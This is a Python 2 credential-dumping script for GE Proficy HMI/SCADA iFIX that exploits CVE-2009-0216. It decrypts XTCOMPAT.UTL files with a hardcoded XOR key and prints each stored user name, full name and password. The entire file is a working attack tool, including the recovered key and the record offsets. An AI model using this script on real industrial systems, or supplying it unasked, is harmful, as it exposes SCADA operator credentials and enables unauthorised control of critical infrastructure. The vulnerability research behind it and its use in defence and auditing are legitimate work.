#!/usr/bin/env python
# -*- coding: utf-8 -*-

## ifixpwdump.py
## dumps credentials from iFix XTCOMPAT.UTL files

## "thanks to: Dieguin Bologna & Yami Levalle :-)"

## usage:
## ./ifixpwdump.py XTCOMPAT.UTL

## GE Fanuc Proficy HMI/SCADA iFIX uses insecure authentication techniques
## https://www.kb.cert.org/vuls/id/310355
## http://www.securityfocus.com/bid/33739
## https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0216

import sys
import os
from hexdump import hexdump

print "-"
print "Dumps credentials from .UTL files (GE Proficy HMI/SCADA iFIX.)"
print "CVE: CVE-2009-0216  |  bid: 33739  |  CERT: Vuln ID 310355"
print "LDB 07/2017 leonardo.brugues <nospam> gmail [.] com"

if len(sys.argv) != 2 or not os.path.isfile(sys.argv[1]):
	print "Error opening file. \nUsage: " + sys.argv[0] + " <file.UTL>"
	sys.exit(1)
else:
	utl_file = sys.argv[1]

try:
	with open(utl_file, "rb") as binary_file:
		data = binary_file.read()
	binary_file.close()
except Exception,e:
	print "Error reading file " + sys.argv[1] + "\n" + str(e).strip()
	sys.exit(1)

key_xor  = ('00 00 00 00') # Cabecera
key_xor += ('14 3a 5b 2b c3 9c f4 b9 01 9b 40 de 08 8b 8b e8 ba b4 ed 67') # Full name
key_xor += ('00 00 00 00 00 00 00 00 00 00 00 00') # Relleno
key_xor += ('f8 4c 30 02 34 f8 77 80 a8 90 a2 2d cc d0 2c 30 62 1c f8 57') # Password
key_xor += ('00 00') # Relleno
key_xor += ('9F E7 07 58 B8 FD') # User
key_xor  = key_xor.replace(' ', '')
key_xor  = key_xor.decode("hex")

## offsets y lenghts
offset_fullname = 4
len_fullname    = 20
offset_passwd   = 36
len_passwd      = 20
offset_user     = 58
len_user        = 6
len_registro    = 206
offset_read     = 0
len_key         = len(key_xor)

# Formato - x: full name - y: password - z: username - _: variable chars
# 00000000 00d:  2c d1 2d f9 xx xx xx xx  xx xx xx xx xx xx xx xx
# 00000010 16d:  xx xx xx xx xx xx xx xx  08 8e 0a b3 4f 9f 3a 18
# 00000020 32d:  79 c5 25 81 yy yy yy yy  yy yy yy yy yy yy yy yy
# 00000030 48d:  yy yy yy yy yy yy yy yy  60 19 zz zz zz zz zz zz

print "\n[*] File: " + utl_file
print "\n[*] Found creds (delimited by []):\n"

desde=0
hasta=len_registro

while desde + len_registro <= len(data):
	temp = data[desde:hasta]  ## leo chunks de len_registro largo
	desofusc =  "".join(chr(ord(x) ^ ord(y)) for x, y in zip(temp, key_xor)) ## xoreo
	
	fullname = desofusc[ offset_fullname : offset_fullname + len_fullname ].strip("\x00")
	passwd   = desofusc[   offset_passwd : offset_passwd   + len_passwd   ].strip("\x00")
	user     = desofusc[     offset_user : offset_user     + len_user     ].strip("\x00")

	print '\t User: {: <8} Full Name: {: <24} Password: {: <22}'.format('['+user+']', '['+fullname+']', '['+passwd+']')
	desde = hasta
	hasta = hasta + len_registro

print "\n<EOF>\n"
